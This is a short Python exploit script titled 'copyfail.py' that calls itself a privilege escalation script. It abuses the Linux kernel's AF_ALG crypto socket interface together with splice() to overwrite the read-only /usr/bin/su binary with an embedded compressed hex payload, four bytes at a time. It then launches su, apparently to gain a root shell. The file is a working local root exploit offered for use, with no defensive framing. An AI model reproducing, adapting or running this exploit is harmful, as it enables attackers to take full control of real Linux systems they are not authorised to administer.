#!/usr/bin/env python3

#################################################################
# file      : copyfail.py
# brief     : Privilage escalation script.
# blog      : https://xint.io/blog/copy-fail-linux-distributions
#################################################################

import os
import zlib
import socket


def hex_to_bytes(x):
  return bytes.fromhex(x)


def send_chunk(file_fd, offset, chunk):
  sock = socket.socket(38, 5, 0)
  sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

  SOL_ALG = 279

  sock.setsockopt(SOL_ALG, 1, hex_to_bytes('0800010000000010' + '0' * 64))
  sock.setsockopt(SOL_ALG, 5, None, 4)

  conn, _ = sock.accept()

  zero = hex_to_bytes('00')
  total = offset + 4

  conn.sendmsg(
    [b"A" * 4 + chunk],
    [
      (SOL_ALG, 3, zero * 4),
      (SOL_ALG, 2, b'\x10' + zero * 19),
      (SOL_ALG, 4, b'\x08' + zero * 3),
    ],
    32768
  )

  r, w = os.pipe()

  os.splice(file_fd, w, total, offset_src=0)
  os.splice(r, conn.fileno(), total)

  try:
    conn.recv(8 + offset)
  except:
    pass


fd = os.open("/usr/bin/su", 0)

payload = zlib.decompress(
  hex_to_bytes(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
  )
)

offset = 0

while offset < len(payload):
  send_chunk(fd, offset, payload[offset:offset + 4])
  offset += 4

os.system("su")
